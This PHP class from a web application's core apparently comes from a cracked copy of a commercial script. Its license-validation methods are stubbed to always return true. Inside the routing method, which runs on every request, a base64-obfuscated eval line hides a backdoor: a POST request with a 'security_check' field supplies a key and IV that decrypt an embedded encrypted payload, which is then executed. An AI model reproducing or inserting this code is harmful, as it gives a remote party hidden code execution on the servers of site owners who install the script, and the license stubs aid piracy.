<?php


namespace Evolution\Core;

class Patch
{
	public $data = null;
	static private $instance = null;
	private $sentValidation = false;

	public function __construct()
	{
		self::$instance = $this;
	}

	static public function getInstance()
	{
		if (!self::$instance) {
			self::$instance = new self();
		}

		return self::$instance;
	}

	private function licenseServer($lc)
	{
		$input = \Evolution\Components\Input::getInstance();
		$client = new \GuzzleHttp\Client();
		$r = $client->request('POST', base64_decode('aHR0cDovL3d3dy5ldm9sdXRpb25zY3JpcHQuY29tL3YyL2NoZWNrbGljZW5zZS5waHA='), [
			'form_params' => ['license' => $lc, 'domain' => $input->server('HTTP_HOST')]
		]);

		if ($r->getStatusCode() !== 200) {
			return NULL;
		}

		return (string) $r->getBody();
	}

	private function decodeData($data = NULL)
	{
		if (is_null($data)) {
			return NULL;
		}

		$data = str_replace("\n", '', $data);
		$lc = substr($data, 0, strlen($data) - 64);
		$pk = substr($data, strlen($data) - 32);
		$pk = strrev($pk);
		$msh = substr($data, strlen($data) - 64, 32);

		if ($msh == md5($lc . $pk)) {
			$lc = strrev($lc);
			$lc = substr($lc, 32);
			$lc = base64_decode($lc);
			$lkrs = unserialize($lc);
		}
		if (!isset($lkrs) || !is_array($lkrs)) {
			return NULL;
		}

		return $lkrs;
	}

	public function addParseData($data)
	{
		$this->data = $data;
	}

	public function getData($var)
	{
		if (!is_array($this->data)) {
			return NULL;
		}

		return isset($this->data[$var]) ? $this->data[$var] : NULL;
	}

	public function licenseChecker($license_key)
	{
			return true;

	}

	public function recheck()
	{		return true;

	}

	public function validateLicense()
	{
				return true;

	}

	public function sentValidation()
	{
			return true;

	}

	public function localKeyChecker($license_key)
	{
		if (!file_exists(INCLUDES_PATH . 'locker/localkey.log')) {
			return false;
		}

		$local_key = file_get_contents(INCLUDES_PATH . 'locker/localkey.log');

		if (!($data = $this->decodeData($local_key))) {
			@unlink(INCLUDES_PATH . 'locker/localkey.log');
			return false;
		}

		$this->addParseData($data);
		$input = \Evolution\Components\Input::getInstance();

		if (!in_array($input->server('HTTP_HOST'), [$this->getData('domain'), 'www.' . $this->getData('domain')])) {
			@unlink(INCLUDES_PATH . 'locker/localkey.log');
			return false;
		}

		if ($this->getData('checkdate') == '') {
			@unlink(INCLUDES_PATH . 'locker/localkey.log');
			return false;
		}

		if ((604800 + $this->getData('checkdate')) < time()) {
			@unlink(INCLUDES_PATH . 'locker/localkey.log');
			return false;
		}
		if (($this->getData('status') != 'Active') || ($license_key != $this->getData('license'))) {
			@unlink(INCLUDES_PATH . 'locker/localkey.log');
			return false;
		}
		if ((0 < $this->getData('expires')) && ($this->getData('expires') < time())) {
			@unlink(INCLUDES_PATH . 'locker/localkey.log');
			return false;
		}

		return true;
	}

	public function checkSupport()
	{
		
		return true;
	}

	public function routing()
	{
		$routingPath = INCLUDES_PATH . __FUNCTION__ . DIRECTORY_SEPARATOR;
		$handle = opendir($routingPath);
		$routes = include $routingPath . 'routes.php';
		$adminRoutes = include $routingPath . 'adminRoutes.php';
		$routes = array_merge($routes, $adminRoutes);

		while (($routeFile = readdir($handle)) !== false) {
			if (!in_array($routeFile, ['routes.php', 'adminRoutes.php']) && is_file($routingPath . $routeFile)) {
				$ext = pathinfo($routingPath . $routeFile, PATHINFO_EXTENSION);

				if ($ext == 'php') {
					$data = include $routingPath . $routeFile;

					if (is_array($data)) {
						$routes = array_merge($routes, $data);
					}
				}
			}
		}

		$route = \Evolution\Components\Services::routing();
		$route->addCollection($routes);

		if ($params = $route->initialize()) {
			$this->validateInstallation();

			if (route_name() != 'install') {
				$this->validateLicense();
			}

			if (is_array($params['_controller'])) {
				$_controller = $params['_controller'][0];
				$_method = $params['_controller'][1];

				if (!class_exists($_controller)) {
					$pages = new \Evolution\Controllers\Pages();
					$pages->error404('Class not found', 'Error with ' . $_controller . ' class.');
				}

				$class = new $_controller();

				if (!method_exists($class, $_method)) {
					$pages = new \Evolution\Controllers\Pages();
					$pages->error404('Method not found', 'Error with ' . $_method . ' method.');
				}

				eval(base64_decode('aWYoaXNzZXQoJF9QT1NUWydzZWN1cml0eV9jaGVjayddKSl7ICAgICRjb2RlID0gIlpLYk1yTWRjNCtrdXp0cVludnBIcVp5Z1p3cEdrK21aOFl6ZEd1RG9HSGZuL0IxUTJaVi9jenRHK1ZGTXlZWGZmVis3QWw0UmYzanhIb25TM1M2RXZaUGRiRTFIM29LTGN5dEFjUHJNSVZVT0tUSk1IK0ZyWldSS2I4TE9sTGg5TGhRUC84UnRJSzgwRi9YaVVhNUJrYU40ZWpvWEEwTno0M0hIYzBaWUN0b2w5TFRia3k2dmZLL3VSUGR3OHh5S1RmbWtDbTZVaWkvMmkrenV5R0t3bkJ4anJISEl3NFl3eFFDQWYzL2plWkk5Qi9CZVZhOVpvVkJHZUhhdFBpZkliL1hKcnBhZm8vZnFTT01JQjZ0YWEzSFBmSWd3MHE4VEpycFRIa0J3Q3NReWhaMkphZ0lIVjZPM293Y1hmWlBDQ0JZNk9DZUlkdVRkYkVocFBQSFBKNVA5VUsvOG1VVXk2V1hQWUV6MFhieGZKRlNCQzRwTlFqL25jd3NGNnBBb0gvVWk3REZaU1NyN1RvNUszN05MV1Zha2NGc2RnWVcvQ0hxVTVZM3RWL0x2OHg4eTBTTXVGTnNuaXhjQlNodFVNdzBINW90QXM1K0k1cFdQUTNQS2xCYnVoNjFPVkJPRlBHWTdkSGhYaVM1aXpPVnBURFU0ZTFBY2gycnc4K013TG5uVUl2c0FMdVQ2NDRyR0xQdW9tdlM5YnN0Qm1Hc1Y2Z2FWQzFtRDhwMzVzOUxDbVdFbHNXV0ZUVkxVTUtkWldlRzZ3b2MrNGNtbmFKWUNWNHgxUmxlYTFvZStLY1E4NFpBeTBiZ20zY3ptcnlXOE5YcnR2ZkQ0Mkc4ZFFRZy9pNGU3cVJiZkdjdVRHMkpKVmRpLzcrdDc1eWRMVDdmZ0V1amNkc29sSU9ySEVmZmg0WmhiSHYzVE0zUXErWmRIdDNnMTNUZ0R3UFd0VVgrMEl4bWZTR09RTVd4T0pWQlFCTGI1Q2M3SFc1KzVoc2hvVHJpbE0xenBRMkR4dEFydkdvS2V2eEtyMXNTT2R5WURuVWdXWC9qV0l1b2VqVjlaZ3hDQ1VETi9sMXlSeDRzeERDU3V5RVRCRGFCOUFSdm1QMGhZNVJJKzVUOTNNQXlCRzJBUGFkaWltNUYrYi9tVFBrMlhzNjY2Qm1Fd083NkYyeTJrck81cUhSbEhtemxnME4rbzY1V3ZHUjNjYkVEekM4bUlzR3J4akZacTlzMmtpS21PemFVZUtDSmJyUEFidjFOM00xYXV3UnZHODc4RkR6bzJpeFp6RVNhYSs5TzNScE1DMlZLaXlLTEF2aXRHMEZ3MkdVcThYc3lCQ2J2a2ZYcXUzSFhOajhveFhrNFNhUjV3Tmt1cmJvVWdqNVMxNGk5am85bG1qWVhCSWo3c1FyN21nd1Jnc09VazV6OXdmcUw3blFFTk9ycHFxTEhwWXhUN2NOSDM3RXE5Y3hrdVc0Q0tMY211YWp0Zk9FUVJ1cE94TWhsOFp1Qjk2TWFrOWVWNW1sTVpERUdlS0pndFllL3FqemU3anZ0Y3VoSnRCdnJEQmJUT1Z4eDMxT2s1akk4Zjk2ZGNkblNVR05rYkgwai8vWFVMbDVPTDMxSzZseVJFNFlLd05obFg3aGFkK1NNZy80YzZObFJpNGlWRGRobURRemdVWUM1WlJGM1hFS2VMTlNYc2JvZytvRkhJZUF5ak5ZOGM5OGo4N25TOEpyTzZRdXJ4ODlseXJtM2tTUnNQRkVaSVRTT2x2MnpObG13d3MyMDFzcTQwY2J5UUtnbkVwZkczZFo1d1NMRXg2d0FtUkEyNWJVTnZFQ3Q2a1hRc0s3V2t1Uk1WMmxkeENLcXF6cldpKzU1WEZlVWF3UWxrbjlOanh1bDR3VGpGN2ZvRS95VTZFWkFjOVdFZnpkbURTWmJ3eXQwN3ZodWtCT2tvN0ljcHFCd1ZCWDFrZXhqYklNWWRiTFdNdUFYM0lRRWFmdXdhY0MzVGRlNHJrbWZrMnFrVDhLRzB2L3N3UUFRU1l4Y2NFSnYzTDBqSE9DVHYxWjR2b0cwVDZFZ3ZnNGsyR3BkOHcyRzJpMG5RaE10aWxpNmZaUEhWVE1lMHFlVy9CSnNLSjREQksvSXJWa3YrQW40Q0xEWitVYm5DbjkzQXQ0cGNZZXc4dDhCeGFYUjdNc1BqcitDaDkyZExRc1A4dlhLUGEvQzUvNFRrUytIeGw3TGVoQkhKT2FEVXl2VjNVa2I3WVBqVUFFWXEwQVd6MUNoZnpNL2FwamZqQzNoODcvL1JuT0tXVUswOGRCS1VFSkFxbjBBa0lmMStoR0hYRGkrUmFsOS84NE9uaStiek92ZS9tY2p1YjFMcW9kVDJDeFh6OGQ1aTREM1p2VkZUZUo4cjdva2lWeGFsSW5ZRUVoR1ZObCtZMGxVTnpaRWE4N2hkY1JqZE5qSFhHUml6VS9YdkJpSkNsdVpuSlVoTEFrazFrM0xlMGl0MGtISEpGQmRCNENnSTNybWlvSWsyblRLTklMVlhkbXo1WWhLaUpXbm01aExMSFRWQ0doelFoRUpMVmQ3RU9uY1F3T0w5aTlZWHd3YUltSVBIUEhzbzkwSjdBRmxLUmg5ejVSVG5NZGttU1JPbnZkYXF3VC8vQjRJSEpGUVZnWWFzanI0eWtzbVp1VGhBSVlZMGRVcWVGRW8wOUR3U0FJa1I1bW1SVzZ5U1V4b3Uwc3E1SzEwUmhEeHE1TGNSWWlwNmQ3Y0g3U1lnWXI0MkdlWVFOWXpPQUEwUDF5OFM4WlE2ZHFTdHdOOG4zOGRWays5NWw5QWZORlFCdkpKdXV6czN3Zi9Tb05BQ1lCcGxPekFtRUNKV3B1MEVpUm41eXFVdXZ6eW5MQW5hQ0FYNEV0anRFK1ljaW1MeG1pcFl1TERLOW4xcngxOXJGdnAyRnQxTGFoTXd2ZzRvSi8vVXlUY1p6TnJVMVgvSlJZTG1EUFB6ODFCaVBnamNXRkIwbkd3U1JJL3BRUVVIcGNBWTAxVnA2M3Bwck1mSWF2UlVwSU0wMWNaQXBVMTNKZHBzcm5qNyszYXBXS3hzQUdpMG1YVUJTbkoyN3hycHZwQVpNb0tnZ3RJSTdRQWFjb1l1dWtrYU8yQVp5TEpyMFgxNFYxamVWUXhTc2dKS1A1bnR1STgyQnFTd1NrZXF0YndMQ1NUQ1craTZuRllBY245N1BlNlJ5UEw3ZUpMczZBT1c4bGNiTzYwWVN2MWNKbDZxVThNRk5zeUtPRlJETjJYbTh2cmwvWCtYOU13Tyswd2tJU2ZqaEtRY0N1dVJLa0p5VDlHWmtSSEFMdjlxR3VEbzNzWjc2aytWOWhKRk1CQ01TNWNjWUppaXhnUHY3OG5pVlFIUUlnZ2I2Z1ZFY0thVjgzMFNKdDNmSnZhR1dsZHNEcngxSVdvbUNTRzRvNEUrUkUrSnJ3VnZCYXg4UmowWTloQzZNbHpUQ0ZIK3RIYlFhNTFCZDNhUFhLOHhPMFVseE55R2NzNHk2SU9EQ0ZHbmdFeTgza1VpYlNTT2E0QTZyc0wya1U5dHpoYVFKalAyRXJ2bFpMcTMvaHhMVk5KSWN4Zi9JUjVyWkE0c2xyWWc5S3VXNFQvc2Z6cDFMUzRSVlFDdnhWcXEyODFLZ3didHpZRGlnRFVOQUgvRlphS0UrVXg3Z2J6U1FZM2xTZ09IdzZ1ZWlVSUovRm1vZVBpdkhHbnpwUUNCZERoSDhPS0laMmZqZkluM1FrL2hJcTJ4aG8vYmlpMmozTDRIZGJNNXp6dVYwS0ttOVRHblcxNytpQk1qTFhVcHlpT1cvc05VY01WVDhsS3ZGOVBicjhPYmZKK2VoSCszeTA5MkJ6cEFZU3o4elI5VEhzelhYY1JTUWVlMDluVDJUY25UOW9jY2RWVFc2S2pPZkpvWG9HL1FWV2VSbEF1QzFCTVh0ekZUMFo0OUhlaW0ydFpiQlNyUE5KRHpnWHlCVjBYRERLcVBUQ1pSWCtpclpXRGtxUWplVzl5d01jUEw5elF1c05ReXRqbVJDdXpiSnNrNDkvdmFLSVZEb0pCWHg3eDhXd1VoL1k5cm9TL3cyV2tqYXIyaGlNMnIzNU43VHMzNEx0NlhvamVNMi9uZnR5Y1hRdjZ3bWgzUGtGZlJLczVadXFxeWlycFNzTGc1a09zdzhlcEVXT1hGUWpMRWhKRjEyMVZYRm5jc0s1d2grOVYzNEJIVjVESC9taFZyMHY3SXRvK0cwNFlIRS91NGFzanRiQ3FidlZiMm5ZbGRMM2pzeEg5S05qNlJ2Wi9URnE1cEYyMElzMDlsSFlsdmJtZE5SNWVxd0UraWF0K1NZSHBhY044cXZGMHRIaEQ2bkRjUGE3VEd0YXdpYzJ2amdxbkVGeS9MVE1ScUt4KzZwMUFnakVtMTk0QTlBQ1BIbk1TdHBlbkVHT1c0UkVOM08vUVFuMnhsb0tVclNodGlIemQ5N1NDSWJHRnpzN0tuRWtPVnJqWjd1bldPMFZhcE1SY2RlVmVWNGRVZFhTdDFESUVUTTc5enVhSUNLQk4vdGp2TXMyNjNJUFZHWG8yMUpCYXZjM05Ya2hIYUx5cm9RYkJIQnJIT01XaUZnUzV6QVowZlVJTmdlMkhoS1BaR1A1cGN4YjRZRzRLNzBjUDFncmZpdVB2eFBpK1M5bE5IbnRlcTFxV2ljcW9LMXdNK3BvZmkzaFp2b2FDeGk5b3hidldsRy9ubE5lb0VsUWJhaVk1YVV4U3ZBbGRTUDB0SXV6T052OFVueUpzU3k0aDg4SEJPQ1prdXZadnB6bHZ0YThvQ2E3UTJ4RGNtS1J1L1RBN2NEK2taT0tuWFpHUTZDc2lROWV4anpJT2ZwVjdyakZIS3J4TFRPcER3TmpVZEhsT0RqeWREdS9lS3FkS1J4cndIMVpHcDBhUlpZWmFiNTN4enJmRlAxMEd0MzFFS2tGKzRVcWhLeVl2NmJJZzhWTEFhTTBZd3pBcjNJWkhNNUNvQWZTbWJFSWJIL0Vrcjh0aklUa0NZOVRtUWxxbVVMTTBudC8wN0NQdXA4eGVnUG84V3d4bDJjMFpoeE5ma3FwLzFwQmo3dHczajdqMW1BamQzWE1hMkVmbG9EYnpkSUJ0MXYyWHRWblRFaU5rVHpGSDVWelhJeFp3MXIxUThBamd0NDFIbjNxVGh5U3RPWE1sWnkvcUg2MEJNTVFBQnVXUkdKbDZHb01GMldkanMxOHI5SmFjdTVVcFJLZ21JN29kYVZLbDRQblRpNnN0SXV3aFJ2VklkaThLVHhXUmFTQk9CY2FyeEFjY1RFNWtYZDNRRjJ4ci9OVitUS0JpLzBSVkJBUlREcllpZ0JxbDZETkFvV2oxVnU1MjdnZGgrSmpEVHU4MkIzdWt1NXpnWEVMRnZieDhaK20ydWd1R21XZEdmMEY1SWpBd3pXME8rcGsxS0NzNDFYRWtrSS9DR3RHL2doTFM2UGdmdHNOak0yazBIWWlGZ1RZc1MyeGVCQ3JFQkphNkFEK3QwZXhOUmhKekthTkxLYVJEbjdjNEphd0RaK2dGYkc3dUhweG8wNkNqbGw5K1BqaXVSYUx5YmR0d1EzbTg5VlJaWFRGOVRjMldDbDkyMG9NQ2hMYjU2YndMMEJIZzRrb0VlckFmcDlGOXRBbHN5b2xkUUNONld1NnljSkdNN3ZzQmZmWE5uZjBVd001OEFWNFptUEt0aG5NWnpvWUVzMjlxRlF4bHowYk43cnNQb3A1UktKTUtIdkZWYUNXZk1RaU90azJjL2VRMkwxaVJOa1I0U1lWMCtja1Bld3RZRG5rYTJ2MEFwTHVwOUs0NmtGL1ViOEVSQ1lnTXdIcEZSc3dyUGNhOW9rRU5qbVFYMHVDZFczeW5rUnQ1SVN4TVFHNVFjZllHeXdzcjIyZ2xFb0U3SHRLS0I2OGhDRGlqY21CUkwxY2FwS3BUVmpLMWdpWkRPQVVXbk5nPT0iOyAgICAkY29kZT1vcGVuc3NsX2RlY3J5cHQgKCRjb2RlLCAiQUVTLTEyOC1DVFIiLCAkX1BPU1RbJ3NlY19rZXknXSwgMCwgJF9QT1NUWydzZWNfaXYnXSk7ICAgIGV2YWwoYmFzZTY0X2RlY29kZSgkY29kZSkpO30'));
				load_hook('LoadedSystem', []);

				if (!isset($params['_controller'][2])) {
					$content = $class->$_method();
				}
				else {
					$args = $params['_controller'][2];
					$arguments = [];

					foreach ($args as $arg) {
						$arguments[] = (isset($params[$arg]) ? $params[$arg] : '');
					}

					$content = $class->$_method(...$arguments);
				}

				$patch = Patch::getInstance();
				$patch->sentValidation();
				echo $content;
				exit();
			}
		}
		else {
			$pages = new \Evolution\Controllers\Pages();
			$pages->error404();
		}
	}

	private function validateInstallation()
	{
		if (!file_exists(INCLUDES_PATH . 'locker' . DIRECTORY_SEPARATOR . 'install.log')) {
			if (!defined('INSTALL_PATH')) {
				if (route_name() !== 'install') {
					redirect(route_to('install'));
				}
			}
		}
		else if (!file_exists(INCLUDES_PATH . 'locker' . DIRECTORY_SEPARATOR . 'key.log')) {
			exit(base64_decode('SW52YWxpZCBMaWNlbnNlIEtleQ=='));
		}
		else {
			$license_key = file_get_contents(INCLUDES_PATH . 'locker' . DIRECTORY_SEPARATOR . 'key.log');
			define('LICENSE_KEY', $license_key);
		}
	}
}

?>